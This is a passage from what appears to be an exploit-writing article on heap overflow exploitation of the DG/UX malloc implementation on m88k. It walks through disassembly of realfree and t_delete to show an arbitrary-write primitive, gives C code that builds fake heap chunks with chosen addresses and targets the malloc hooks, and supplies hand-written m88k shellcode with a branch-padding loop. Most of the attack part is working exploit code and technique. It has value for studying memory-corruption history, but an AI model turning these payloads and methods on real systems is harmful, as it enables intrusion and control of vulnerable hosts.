+0x80060314 <realfree+548>:      st              r23,r0,r13
+0x80060318 <realfree+552>:      tb1             0x01,r0,0xff
+0x8006031c <realfree+556>:      ld              r12,r0,r23
+0x80060320 <realfree+560>:      addu            r12,r23,r12
+0x80060324 <realfree+564>:      ld              r13,r12,0x10
+0x80060328 <realfree+568>:      or              r13,r13,0x02
+0x8006032c <realfree+572>:      st              r13,r12,0x10
+0x80060330 <realfree+576>:      ld              r1,r31,0x40
+0x80060334 <realfree+580>:      ld              r21,r31,0x2c
+0x80060338 <realfree+584>:      ld.d            r24,r31,0x38
+0x8006033c <realfree+588>:      ld.d            r22,r31,0x30
+0x80060340 <realfree+592>:      jmp.n           r1
+0x80060344 <realfree+596>:      addu            r31,r31,0x50
+----------------------------------------------------------- end  of realfree.S
+
+ So we are now finish - t_delete.Pay u attention on part 0x800604c0-0x800604d4.
+ $r24   =   $r2  =  address of chunk, e.g. memory that controlled by us. So, we
+ are  write  on address *(*(chank+0x10)+0x40)=*(chank+0x10). One thing that not
+ good,  what  we  also  write  on  address  0x40.  So, shellcode, must be in 16
+ instructions,  or  needed  jump  in shellcode body. We will do second variant.
+ coz:
+
+ 1) - 16 bytes its enough, but who know that will do in future.
+
+ 2) - we will jumping across stack, its problem not solved by standart nops coz
+      in front on 0x40 offset  Illegal Instruction will wait for us :)
+
+----------------------------------------------------------- begin of t_delete.S
+0x80060490 <t_delete>:  subu            r31,r31,0x40
+0x80060494 <t_delete+4>:        st              r1,r31,0x30
+0x80060498 <t_delete+8>:        st.d            r24,r31,0x28
+0x8006049c <t_delete+12>:       or              r24,r0,r2
+0x800604a0 <t_delete+16>:       or.u            r25,r0,0x04
+0x800604a4 <t_delete+20>:       tb1             0x01,r0,0xff
+
+0x800604a8 <t_delete+24>:       ld              r13,r24,0x20
+0x800604ac <t_delete+28>:       bsr.n            <t_delete+36>
+0x800604b0 <t_delete+32>:       or              r25,r25,0xb1c4
+0x800604b4 <t_delete+36>:       addu            r13,r13,0x01
+
+0x800604b8 <t_delete+40>:       bcnd.n          ne0,r13, <t_delete+72> 
+0x800604bc <t_delete+44>:       addu            r25,r25,r1
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+0x800604c0 <t_delete+48>:       ld              r10,r24,0x10
+0x800604c4 <t_delete+52>:       ld              r12,r24,0x40
+0x800604c8 <t_delete+56>:       bcnd            eq0,r12, <t_delete+64>
+0x800604cc <t_delete+60>:       st              r10,r12,0x10
+0x800604d0 <t_delete+64>:       st              r12,r10,0x40
+0x800604d4 <t_delete+68>:       br              <t_delete+480>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+0x800604d8 <t_delete+72>:       tb1             0x01,r0,0xff
+0x800604dc <t_delete+76>:       ld              r13,r24,0x10
+0x800604e0 <t_delete+80>:       bcnd            eq0,r13, <t_delete+92>
+0x800604e4 <t_delete+84>:       bsr.n            <t_splay>
+0x800604e8 <t_delete+88>:       or              r2,r0,r24
+0x800604ec <t_delete+92>:       tb1             0x01,r0,0xff
+
+0x800604f0 <t_delete+96>:       ld              r10,r24,0x40
+0x800604f4 <t_delete+100>:      bcnd            eq0,r10, <t_delete+160>
+0x800604f8 <t_delete+104>:      st              r0,r10,0x10
+0x800604fc <t_delete+108>:      tb1             0x01,r0,0xff
+0x80060500 <t_delete+112>:      ld              r12,r24,0x20
+0x80060504 <t_delete+116>:      bcnd            eq0,r12, <t_delete+124>
+0x80060508 <t_delete+120>:      st              r10,r12,0x10
+0x8006050c <t_delete+124>:      st              r12,r10,0x20
+0x80060510 <t_delete+128>:      tb1             0x01,r0,0xff
+0x80060514 <t_delete+132>:      ld              r12,r24,0x30
+0x80060518 <t_delete+136>:      bcnd            eq0,r12, <t_delete+144>
+0x8006051c <t_delete+140>:      st              r10,r12,0x10
+0x80060520 <t_delete+144>:      ld              r13,r25,0x450
+0x80060524 <t_delete+148>:      st              r12,r10,0x30
+0x80060528 <t_delete+152>:      br.n             <t_delete+480>
+0x8006052c <t_delete+156>:      st              r10,r0,r13
+0x80060530 <t_delete+160>:      tb1             0x01,r0,0xff
+0x80060534 <t_delete+164>:      ld              r10,r24,0x20
+0x80060538 <t_delete+168>:      bcnd            eq0,r10, <t_delete+456>
+0x8006053c <t_delete+172>:      st              r0,r10,0x10
+0x80060540 <t_delete+176>:      tb1             0x01,r0,0xff
+0x80060544 <t_delete+180>:      ld              r13,r24,0x30
+0x80060548 <t_delete+184>:      bcnd            eq0,r13, <t_delete+472>
+
+0x8006054c <t_delete+188>:      tb1             0x01,r0,0xff
+0x80060550 <t_delete+192>:      ld              r12,r10,0x30
+0x80060554 <t_delete+196>:      bcnd            eq0,r12, <t_delete+428>
+0x80060558 <t_delete+200>:      ld              r11,r12,0x30
+0x8006055c <t_delete+204>:      bcnd            eq0,r11, <t_delete+316>
+0x80060560 <t_delete+208>:      ld              r13,r11,0x20
+0x80060564 <t_delete+212>:      st              r13,r12,0x30
+0x80060568 <t_delete+216>:      tb1             0x01,r0,0xff
+0x8006056c <t_delete+220>:      ld              r13,r12,0x30
+0x80060570 <t_delete+224>:      bcnd            eq0,r13, <t_delete+236>
+0x80060574 <t_delete+228>:      ld              r13,r12,0x30
+0x80060578 <t_delete+232>:      st              r12,r13,0x10
+0x8006057c <t_delete+236>:      tb1             0x01,r0,0xff
+0x80060580 <t_delete+240>:      ld              r13,r10,0x10
+0x80060584 <t_delete+244>:      st              r13,r11,0x10
+0x80060588 <t_delete+248>:      tb1             0x01,r0,0xff
+0x8006058c <t_delete+252>:      ld              r13,r11,0x10
+0x80060590 <t_delete+256>:      bcnd            eq0,r13, <t_delete+300>
+0x80060594 <t_delete+260>:      ld              r13,r10,0x10
+0x80060598 <t_delete+264>:      ld              r13,r13,0x20
+0x8006059c <t_delete+268>:      cmp             r13,r13,r10
+0x800605a0 <t_delete+272>:      bb1             0x03,r13, <t_delete+288>
+0x800605a4 <t_delete+276>:      ld              r13,r11,0x10
+0x800605a8 <t_delete+280>:      st              r11,r13,0x20
+0x800605ac <t_delete+284>:      br               <t_delete+300>
+0x800605b0 <t_delete+288>:      tb1             0x01,r0,0xff
+0x800605b4 <t_delete+292>:      ld              r13,r11,0x10
+0x800605b8 <t_delete+296>:      st              r11,r13,0x30
+0x800605bc <t_delete+300>:      st              r11,r10,0x10
+0x800605c0 <t_delete+304>:      st              r10,r11,0x20
+0x800605c4 <t_delete+308>:      br.n             <t_delete+188>
+0x800605c8 <t_delete+312>:      or              r10,r0,r11
+0x800605cc <t_delete+316>:      tb1             0x01,r0,0xff
+0x800605d0 <t_delete+320>:      ld              r13,r12,0x20
+0x800605d4 <t_delete+324>:      st              r13,r10,0x30
+0x800605d8 <t_delete+328>:      tb1             0x01,r0,0xff
+0x800605dc <t_delete+332>:      ld              r13,r10,0x30
+0x800605e0 <t_delete+336>:      bcnd            eq0,r13, <t_delete+348>
+0x800605e4 <t_delete+340>:      ld              r13,r10,0x30
+0x800605e8 <t_delete+344>:      st              r10,r13,0x10
+0x800605ec <t_delete+348>:      tb1             0x01,r0,0xff
+0x800605f0 <t_delete+352>:      ld              r13,r10,0x10
+0x800605f4 <t_delete+356>:      st              r13,r12,0x10
+0x800605f8 <t_delete+360>:      tb1             0x01,r0,0xff
+0x800605fc <t_delete+364>:      ld              r13,r12,0x10
+0x80060600 <t_delete+368>:      bcnd            eq0,r13, <t_delete+412>
+0x80060604 <t_delete+372>:      ld              r13,r10,0x10
+0x80060608 <t_delete+376>:      ld              r13,r13,0x20
+0x8006060c <t_delete+380>:      cmp             r13,r13,r10
+0x80060610 <t_delete+384>:      bb1             0x03,r13, <t_delete+400>
+0x80060614 <t_delete+388>:      ld              r13,r12,0x10
+0x80060618 <t_delete+392>:      st              r12,r13,0x20
+0x8006061c <t_delete+396>:      br               <t_delete+412>
+0x80060620 <t_delete+400>:      tb1             0x01,r0,0xff
+0x80060624 <t_delete+404>:      ld              r13,r12,0x10
+0x80060628 <t_delete+408>:      st              r12,r13,0x30
+0x8006062c <t_delete+412>:      st              r10,r12,0x20
+0x80060630 <t_delete+416>:      st              r12,r10,0x10
+0x80060634 <t_delete+420>:      br.n             <t_delete+188>
+0x80060638 <t_delete+424>:      or              r10,r0,r12
+0x8006063c <t_delete+428>:      tb1             0x01,r0,0xff
+0x80060640 <t_delete+432>:      ld              r13,r24,0x30
+0x80060644 <t_delete+436>:      st              r13,r10,0x30
+0x80060648 <t_delete+440>:      tb1             0x01,r0,0xff
+0x8006064c <t_delete+444>:      ld              r13,r10,0x30
+0x80060650 <t_delete+448>:      st              r10,r13,0x10
+0x80060654 <t_delete+452>:      br               <t_delete+472>
+0x80060658 <t_delete+456>:      tb1             0x01,r0,0xff
+0x8006065c <t_delete+460>:      ld              r10,r24,0x30
+0x80060660 <t_delete+464>:      bcnd            eq0,r10, <t_delete+472>
+0x80060664 <t_delete+468>:      st              r0,r10,0x10
+0x80060668 <t_delete+472>:      ld              r13,r25,0x450
+0x8006066c <t_delete+476>:      st              r10,r0,r13
+0x80060670 <t_delete+480>:      ld              r1,r31,0x30
+0x80060674 <t_delete+484>:      ld.d            r24,r31,0x28
+0x80060678 <t_delete+488>:      jmp.n           r1
+0x8006067c <t_delete+492>:      addu            r31,r31,0x40
+
+----------------------------------------------------------- end of t_delete.S
+
+ Question  what  we  will write we are known - address of stack with shellcode.
+ Needed  to  know  in  where, .plt table not much, since addressing of all code
+ segment starting with NULL.
+ 
+ So,  for  solve that problem, we will use already mentioned malloc hooks. Good
+ things,  what  their  located  in  malloc,  so no bus_error and access unmaped
+ pages, bad things it is depends of libc. But its not terrible, because address
+ where hook lie, we may simple find in libc.so.
+
+ So, will trying to unite all info. And quick describe what needed to do.
+
+ 1) Find already worked last chunk. for example 0x0011d3c8
+
+ 2) Find size of  malloc that  call from program.  example 0x400, and create on
+    address (0x0011d3c8+0x400+0x10) chunk  with length of small negative number
+    (it's not necessary, but for space economy)
+
+        // BB chunk with which program will work when malloc called
+        // BB = 0x0011d3c8 + 0x400 + 0x10
+        // STARTEVIL - OUR VICTIM (see begin of article)
+        unsigned int STARTEVIL=0x0011ee50;
+        FIRSTCH=BB-0x410;
+        CHANKINF=STARTEVIL;
+        EVILCH=STARTEVIL+0x400-BB;
+
+ I calculated length in that manner, that let me appeared in begin of my memory
+ that been rewrited.
+
+ 3) Create  chunk which  will in middle of list (needed for t_delete) but, with
+    necessary to kill them.
+        
+        unsigned int EVILCH40=0x800aca28; // LOOK at *(.got+0x24)+0x08+0x10
+        unsigned int EVILCH10=0xeffffeec; // SP
+        unsigned int EVILCH0=0xFFFFFFC0;  // mark that chunk needed to delete
+        unsigned int EVILCH20=0xFFFFFFFF; // for a good  lucky (some of these 
+                                          // bits must be 1)
+        
+        memcpy(evil+FIRSTCH-STARTEVIL,&EVILCH,4);
+        memcpy(evil+CHANKINF-STARTEVIL,&EVILCH0,4);
+        memcpy(evil+CHANKINF-STARTEVIL+0x10,&EVILCH10,4);
+        memcpy(evil+CHANKINF-STARTEVIL+0x20,&EVILCH20,4);
+        memcpy(evil+CHANKINF-STARTEVIL+0x40,&EVILCH40,4);
+
+ 4) Writing shellcode.
+
+        text
+                align    8
+                global   main
+        main:
+        subu        r30,r31,0x114       ; 67 df 01 14     
+        or.u        r10,r0,0x2f74       ; 5d 40 2f 74     
+        or          r11,r10,0x6d70      ; 59 6a 6d 70     
+        or.u        r12,r0,0x2f73       ; 5d 80 2f 73     
+        or          r13,r12,0x6944      ; 59 ac 69 44     
+        subu        r13,r13,0x144       ; 65 ad 01 44     
+        st          r11,r30,0x110       ; 25 7e 01 10     
+        st          r13,r30,0x114       ; 25 be 01 14     
+        addu        r2,r30,0x110        ; 60 5e 01 10     
+        st          r2,r30,0x108        ; 24 5e 01 08     
+        st          r0,r30,0x10c        ; 24 1e 01 0c     
+        addu        r3,r30,0x108        ; 60 7e 01 08     
+        addu        r4,r30,0x108        ; 60 9e 01 08     
+        or          r9,r0,0x109         ; 59 20 01 09     
+        subu        r9,r9,0x101         ; 65 29 01 01     
+        tb0         0,r1,0x1c2          ; f0 01 d1 c2     
+        
+ This shellcode most probably writing by bawd, but may be , it was generated by
+ itself :)
+
+
+ 5) inserting  jumps in shellcode.
+
+ mydecome=-(short)((sizeof(shell)-1)/4);mydecome++;
+ for (i=EVILSIZE-SHOFF+INC+sizeof(shell)-1;i<EVILSIZE;i+=4) 
+
+ {
+        // br   0xc3 0xff (number of commands from this) all 4 bytes  
+        mydecome--;
+        if (mydecome % 0xFF == 0) continue;
+        evil[i]=0xc3;
+        evil[i+1]=0xff;
+        memcpy(evil+i+2,&mydecome,2);
+        mydecome--;
+ }
+
+
+ On  this  optimistic  note I would like and to finish ours travel in wonderful
+ country of DG/UX.
+
+
+ References.
+
+ [1] http://phrack.org/phrack/57/p57-0x09
+ [2] http://www.opensource.apple.com/darwinsource/10.3/gas-495/m88k.c
